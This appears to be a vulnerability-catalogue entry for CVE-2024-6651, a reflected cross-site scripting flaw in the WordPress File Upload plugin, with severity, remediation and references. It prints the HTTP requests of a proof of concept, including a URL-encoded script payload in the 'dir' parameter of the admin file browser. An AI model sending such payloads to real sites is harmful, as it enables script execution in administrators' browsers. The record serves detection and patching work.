---
layout: "post"
cve_id: "CVE-2024-6651"
title: "WordPress File Upload Plugin < 4.24.8 - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-6651.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6651.yaml"
author: "ritikchaddha"
severity: "high"
impact: "Attackers can execute arbitrary JavaScript in administrator browsers by crafting malicious URLs with XSS payloads in the dir parameter.
"
remediation: "Update WordPress File Upload plugin to version 4.24.8 or later to address the reflected XSS vulnerability.
"
reference:
  - "https://wpscan.com/vulnerability/65e2c77d-09bd-4a44-81d9-d7a5db0e0f84"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-6651"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N', 'cvss-score': 7.1, 'cve-id': 'CVE-2024-6651', 'cwe-id': 'CWE-79', 'epss-score': 0.11531, 'epss-percentile': 0.934}"
metadata: "{'max-request': 3, 'vendor': 'WordPress', 'product': 'wp-file-upload', 'fofa-query': "body='wp-content/plugins/wp-file-upload/'"}"
tags:
  - "cve"
  - "cve2024"
  - "wp"
  - "wordpress"
  - "wp-plugin"
  - "xss"
  - "wp-file-upload"
  - "authenticated"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
The WordPress File Upload plugin before version 4.24.8 contains a reflected cross-site scripting vulnerability. The plugin does not properly sanitize and escape the 'dir' parameter in the file browser page before outputting it back, which could allow attackers to execute arbitrary JavaScript code in an administrator's browser context.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0
Connection: close
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=mMlHjp&pwd=pMrseQ&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/options-general.php?page=wordpress_file_upload&action=file_browser&dir=7b2BEyT8ArR1jaD9%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctest%20test%3D HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.6
Connection: close
Accept-Encoding: gzip
```

